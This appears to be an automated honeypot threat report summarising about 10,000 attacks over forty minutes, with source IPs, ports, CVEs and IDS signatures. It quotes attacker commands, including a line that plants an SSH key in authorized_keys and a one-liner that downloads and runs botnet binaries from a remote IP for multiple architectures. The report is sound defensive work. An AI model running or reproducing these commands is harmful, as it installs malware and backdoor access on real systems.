Honeypot Attack Summary Report
Report Generated: 2025-10-01T05:01:25Z
Timeframe: 2025-10-01T04:20:01Z - 2025-10-01T05:00:01Z
Files used for this report:
- agg_log_20251001T042001Z.json
- agg_log_20251001T044001Z.json
- agg_log_20251001T050001Z.json

Executive Summary
This report summarizes 10,432 attacks recorded across multiple honeypots. The most targeted services were Dionaea, Mailoney, and Honeytrap. The top attacking IP addresses were 92.242.166.161, 218.17.50.212, and 45.130.190.34. The most targeted ports were 445 (SMB) and 25 (SMTP). Several CVEs were detected, and a variety of commands were attempted by attackers, primarily focused on reconnaissance and establishing persistence.

Detailed Analysis
Attacks by honeypot:
- Dionaea: 2536
- Mailoney: 1697
- Honeytrap: 2159
- Cowrie: 1014
- Ciscoasa: 1422
- Suricata: 1362
- H0neytr4p: 36
- ConPot: 49
- Tanner: 30
- Sentrypeer: 11
- ElasticPot: 6
- Adbhoney: 20
- Redishoneypot: 48
- Honeyaml: 33
- Dicompot: 8
- Ipphoney: 1

Top attacking IPs:
- 92.242.166.161: 1646
- 218.17.50.212: 1417
- 45.130.190.34: 1033
- 185.156.73.167: 365
- 92.63.197.55: 362
- 185.156.73.166: 368
- 92.63.197.59: 333
- 156.236.73.80: 249
- 92.191.96.171: 244
- 14.103.114.199: 186

Top targeted ports/protocols:
- 445: 2465
- 25: 1697
- 22: 172
- 8333: 103
- 6379: 79
- 443: 36
- 80: 36

Most common CVEs:
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2024-12856 CVE-2024-12856 CVE-2024-12885
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255

Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password: 
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; busybox wget http://94.154.35.154/arm5.urbotnetisass; curl http://94.154.35.154/arm5.urbotnetisass -O; chmod +x arm5.urbotnetisass; ./arm5.urbotnetisass android; busybox wget http://94.154.35.154/arm6.urbotnetisass; curl http://94.154.35.154/arm6.urbotnetisass -O; chmod +x arm6.urbotnetisass; ./arm6.urbotnetisass android; busybox wget http://94.154.35.154/arm7.urbotnetisass; curl http://94.154.35.154/arm7.urbotnetisass -O; chmod +x arm7.urbotnetisass; ./arm7.urbotnetisass android; busybox wget http://94.154.35.154/x86_32.urbotnetisass; curl http://94.154.35.154/x86_32.urbotnetisass -O; chmod +x x86_32.urbotnetisass; ./x86_32.urbotnetisass android; busybox wget http://94.154.35.154/mips.urbotnetisass; curl http://94.154.35.154/mips.urbotnetisass -O; chmod +x mips.urbotnetisass; ./mips.urbotnetisass android; busybox wget http://94.154.35.154/mipsel.urbotnetisass; curl http://94.154.35.154/mipsel.urbotnetisass -O; chmod +x mipsel.urbotnetisass; ./mipsel.urbotnetisass android

Signatures triggered:
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN NMAP -sS window 1024
- 2009582
- ET INFO Reserved Internal IP Traffic
- 2002752

Users / login attempts:
- root/nPSpP4PBW0
- 345gs5662d34/345gs5662d34
- postmaster/123
- root/2glehe5t24th1issZs
- oracle/oracle#123
- root/1!p@ssword

Files uploaded/downloaded:
- 104.199.212.115:8088
- apply.cgi
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- azenv.php

HTTP User-Agents:
- N/A

SSH clients and servers:
- N/A

Top attacker AS organizations:
- N/A

Key Observations and Anomalies
- A significant amount of scanning activity was observed from a small number of IP addresses, suggesting targeted reconnaissance.
- The commands executed by attackers indicate a focus on establishing persistent access (e.g., modifying `.ssh/authorized_keys`) and deploying malware (e.g., downloading and executing `urbotnetisass`).
- The most common attack vectors were SMB (Port 445) and SMTP (Port 25), indicating that attackers are targeting common enterprise services.
- The presence of multiple CVEs suggests that attackers are attempting to exploit known vulnerabilities.
